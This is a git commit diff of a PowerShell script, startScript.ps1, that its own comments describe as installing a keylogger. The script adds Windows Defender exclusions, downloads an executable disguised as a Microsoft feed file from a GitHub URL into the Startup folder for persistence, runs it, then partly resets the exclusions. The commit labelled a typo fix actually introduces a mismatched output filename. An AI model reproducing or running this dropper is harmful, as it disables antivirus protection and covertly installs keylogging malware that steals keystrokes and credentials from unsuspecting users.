a80bae8719db7d44dc83dccd78a1d776ff191eb8
Aroft <139874241+Aroft-Developer@users.noreply.github.com>
2025-11-23 11:09:27 +0100

    Fix filename typo in download command

--- startScript.ps1
+++ startScript.ps1
@@ -1,6 +1,6 @@
 Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
-Invoke-WebRequest "https://github.com/Aroft-Developer/NBVCXWMLKJHGFDSQPOIUYTTREEZE/raw/main/MicrosoftStartFeed.exe" -OutFile "MicrosoftStarterFeed.exe"#Download keylogger script
+Invoke-WebRequest "https://github.com/Aroft-Developer/NBVCXWMLKJHGFDSQPOIUYTTREEZE/raw/main/MicrosoftStartFeed.exe" -OutFile "MicrosoftStarterFee.exe"#Download keylogger script
 Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\MicrosoftStarterFeed.exe -Force #Add exception for keylogger.exe file in antivirus
 Start-Process MicrosoftStarterFeed.exe #Start keylogger script
 Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
